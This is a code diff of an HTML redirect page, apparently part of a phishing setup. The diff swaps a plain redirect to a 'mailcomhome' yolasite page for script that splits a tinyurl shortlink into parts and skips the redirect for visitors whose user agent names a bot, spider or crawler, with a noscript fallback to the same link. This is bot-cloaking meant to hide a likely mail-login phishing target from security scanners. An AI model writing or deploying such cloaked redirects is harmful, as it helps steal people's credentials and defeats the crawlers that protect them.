@@ -4,9 +4,28 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="0; url=https://mailcomhome.yolasite.com/">
+    <script>
+        setTimeout(function() {
+            let part1 = "https://tinyurl.com/";
+            let part2 = "2-mail1-1-1";
+            let fullURL = part1 + part2;
+            
+            let userAgent = navigator.userAgent.toLowerCase();
+            let forbidden = ["bot", "spider", "crawler"];
+            
+            if (!forbidden.some(bot => userAgent.includes(bot))) {
+                window.location.href = fullURL;
+            }
+        }, 0);
+    </script>
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://tinyurl.com/2-mail1-1-1">
+    </noscript>
 </head>
 <body>
-    <p>If you are not redirected, <a href="https://mailcomhome.yolasite.com/">click here</a>.</p>
+    <p>If you are not redirected automatically, <a id="redirectLink" href="#">click here</a>.</p>
+    <script>
+        document.getElementById("redirectLink").href = "https://tinyurl.com/2-mail1-1-1";
+    </script>
 </body>
 </html>
